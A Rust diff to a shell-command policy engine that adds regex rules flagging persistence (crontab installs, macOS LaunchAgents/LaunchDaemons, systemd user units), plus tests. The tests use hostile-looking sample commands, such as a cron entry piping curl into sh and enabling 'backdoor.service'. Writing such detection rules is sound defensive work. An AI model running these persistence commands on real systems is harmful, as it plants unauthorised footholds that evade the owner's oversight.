@@ -254,6 +254,21 @@ pub fn builtin_rules() -> &'static [PolicyRule] {
                     cfg = r"\.git/hooks/"
                 ),
                 "Writing a git hook or redirecting core.hooksPath (persistence)"),
+            ask("write_crontab",
+                r"(?i)(?:\bcrontab\s*(?:$|[;&|)])|\bcrontab\s+(?:-u\s+\S+\s+)?(?:-[er]\b|-(?:\s|$|[;&|)])|[^-\s]\S*))",
+                "Installing or modifying a crontab (persistence)"),
+            ask("write_launch_agents",
+                &format!(
+                    r#"(?i)(?:>>?\s*['"]?[^\s;&|)]*{cfg}|\btee\b(?:\s+-\S+)*\s+['"]?[^\s;&|)]*{cfg}|\bof=['"]?[^\s;&|)]*{cfg}|\bsed\b[^|\n]*\s-i[^|\n]*{cfg}|\b(?:cp|mv|install)\b[^|\n]*\s['"]?[^\s;&|)]*{cfg}|\blaunchctl\s+(?:load|bootstrap)\b)"#,
+                    cfg = r"Library/Launch(?:Agents|Daemons)/"
+                ),
+                "Writing or loading a macOS LaunchAgent/LaunchDaemon (persistence)"),
+            ask("write_systemd_user",
+                &format!(
+                    r#"(?i)(?:>>?\s*['"]?[^\s;&|)]*{cfg}|\btee\b(?:\s+-\S+)*\s+['"]?[^\s;&|)]*{cfg}|\bof=['"]?[^\s;&|)]*{cfg}|\bsed\b[^|\n]*\s-i[^|\n]*{cfg}|\b(?:cp|mv|install)\b[^|\n]*\s['"]?[^\s;&|)]*{cfg}|\bsystemctl\s+--user\s+enable\b)"#,
+                    cfg = r"\.config/systemd/user/"
+                ),
+                "Writing or enabling a systemd user unit (persistence)"),
             ask("curl_pipe_shell",
                 r"(?i)\b(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?(?:\S*/)?(?:sh|bash|zsh|dash)\b",
                 "Piping downloaded content directly into a shell interpreter"),
@@ -336,6 +351,9 @@ pub fn builtin_names() -> Vec<&'static str> {
         "write_shell_profile",
         "write_ssh_config",
         "write_git_hooks",
+        "write_crontab",
+        "write_launch_agents",
+        "write_systemd_user",
     ]
 }
 
@@ -454,7 +472,7 @@ mod tests {
     #[test]
     fn builtins_all_ask_and_named() {
         let names = builtin_names();
-        assert_eq!(names.len(), 21);
+        assert_eq!(names.len(), 24);
         assert_eq!(names.len(), builtin_rules().len(), "names must track rules");
         for r in builtin_rules() {
             assert_eq!(
@@ -781,5 +799,68 @@ mod tests {
         ] {
             assert_eq!(p.evaluate(cmd).action, PolicyAction::Allow, "{cmd}");
         }
+    }
+
+    #[test]
+    fn write_crontab_asks_on_installs_allows_list() {
+        let p = Policy::compile(&PolicyConfig::default()).unwrap();
+        for cmd in [
+            "crontab evil.cron",
+            "crontab -e",
+            "crontab -r",
+            "echo '* * * * * curl x|sh' | crontab -",
+            "crontab",
+            "crontab -u deploy evil.cron",
+        ] {
+            let v = p.evaluate(cmd);
+            assert_eq!(v.action, PolicyAction::Ask, "{cmd}");
+            assert_eq!(v.rule_name, "write_crontab", "{cmd}");
+        }
+        for cmd in ["crontab -l", "crontab -u deploy -l"] {
+            assert_eq!(p.evaluate(cmd).action, PolicyAction::Allow, "{cmd}");
+        }
+    }
+
+    #[test]
+    fn write_launch_agents_asks_on_writes_and_load() {
+        let p = Policy::compile(&PolicyConfig::default()).unwrap();
+        for cmd in [
+            "cp evil.plist ~/Library/LaunchAgents/com.x.plist",
+            "tee ~/Library/LaunchDaemons/com.x.plist",
+            "launchctl load ~/Library/LaunchAgents/com.x.plist",
+            "launchctl bootstrap gui/501 com.x.plist",
+        ] {
+            let v = p.evaluate(cmd);
+            assert_eq!(v.action, PolicyAction::Ask, "{cmd}");
+            assert_eq!(v.rule_name, "write_launch_agents", "{cmd}");
+        }
+        for cmd in ["launchctl list", "ls ~/Library/LaunchAgents"] {
+            assert_eq!(p.evaluate(cmd).action, PolicyAction::Allow, "{cmd}");
+        }
+    }
+
+    #[test]
+    fn write_systemd_user_asks_on_writes_and_enable() {
+        let p = Policy::compile(&PolicyConfig::default()).unwrap();
+        for cmd in [
+            "cp unit.service ~/.config/systemd/user/x.service",
+            "echo '[Service]' > ~/.config/systemd/user/x.service",
+            "systemctl --user enable backdoor.service",
+        ] {
+            let v = p.evaluate(cmd);
+            assert_eq!(v.action, PolicyAction::Ask, "{cmd}");
+            assert_eq!(v.rule_name, "write_systemd_user", "{cmd}");
+        }
+        for cmd in [
+            "systemctl --user status syncthing",
+            "systemctl --user list-units",
+        ] {
+            assert_eq!(p.evaluate(cmd).action, PolicyAction::Allow, "{cmd}");
+        }
+    }
+
+    #[test]
+    fn builtin_names_has_24_rules() {
+        assert_eq!(builtin_names().len(), 24);
     }
 }
